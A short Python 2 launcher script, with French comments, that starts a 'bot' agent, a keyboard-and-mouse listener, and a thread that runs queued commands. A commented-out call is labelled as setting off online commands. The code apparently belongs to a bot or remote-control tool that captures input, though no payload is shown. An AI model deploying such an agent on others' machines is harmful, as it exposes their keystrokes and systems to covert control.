# -*- coding: utf-8 -*-
"""
Created on Thur Apr 28 22:25:43 2016

@author: abdelmajid
"""
import threading

from bot import *
from commande import Commande
import time

agent=Agent().recuperer_agent_constants()
Commande.agent=agent
agent.recuperer_id_file()
agent.clavierMouse.start()#on lance l'écouteur du clavier et Mouse
#
agent.start()
#-----------------------------
#agent.boom() # lancer les commandes en lignes.(exploser)
agent.join()#attend la terminaison de thread, qui sera jamais terminer.

print 'Ageeent joined'


"""
print "_____infos_____"
print agent.to_dict()
print "_____commandes____"
for id_,cmd_ in agent.commandes.items():
    print "***id=",id_
    print cmd_.commande_to_dict()
"""
